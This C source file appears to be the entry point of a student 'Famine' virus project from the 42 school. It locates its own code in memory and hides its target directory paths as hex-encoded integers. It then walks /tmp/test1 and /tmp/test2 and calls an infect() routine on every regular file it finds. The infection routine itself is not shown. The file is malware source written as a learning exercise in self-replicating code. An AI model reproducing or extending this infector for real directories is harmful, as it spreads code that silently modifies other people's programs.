/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/04 14:43:01 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#define BUFF_SIZE 0x1000

void _start() {
	byte		*start_rip;
	get_rip(start_rip);

	int64_t		ret = 0;
	uint64_t	fd;
	byte		buff[BUFF_SIZE];
	//str		directories[] = {"/tmp/test1", "/tmp/test2", NULL};
	uint64_t	directories[] = {0x7365742f706d742f, 0x003174, 0x7365742f706d742f, 0x003274, 0, 0};
	char		max_path[513];
	dirent		*d;
	uint64_t	string = 0x000a303132333435;
	profiling	this;
	
	start_rip -= 0x12;
	this = get_profiling(start_rip);
	(void)this;

	write(ret, 1, &string, sizeof(uint64_t));

	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
		str	dir_name = (str)&directories[dir_index];
		size_t len_dir = ft_strlen(dir_name);

		for (size_t i = 0; i < len_dir; i++)
			max_path[i] = dir_name[i];
		max_path[len_dir] = '/';

		open(fd, dir_name, O_RDONLY);	

		getdents(ret, fd, buff, BUFF_SIZE);
		if (ret < 0) {
			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
		}

		while (ret > 0) {
			int64_t	d_offset = 0;

			while (d_offset < ret) {
				byte	d_type;

				d = (dirent *)((uint64_t)(buff) + d_offset);
				d_type = buff[d_offset + d->d_reclen - 1];

				if (d_type == DT_REG) {
					size_t	file_size = ft_strlen(d->d_name);

					for (size_t i = len_dir + 1; i < 513; i++)
						max_path[i] = 0;

					for (size_t i = 0; i < file_size; i++)
						max_path[len_dir + 1 + i] = d->d_name[i];

					infect(&this, max_path);
				}

				d_offset += d->d_reclen;
			}

			getdents(ret, fd, buff, BUFF_SIZE);
			if (ret < 0) {
				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
			}
		}

		for (size_t i = 0; i < len_dir + 1; i++)
			max_path[i] = 0;
	}

	exit(0);
}
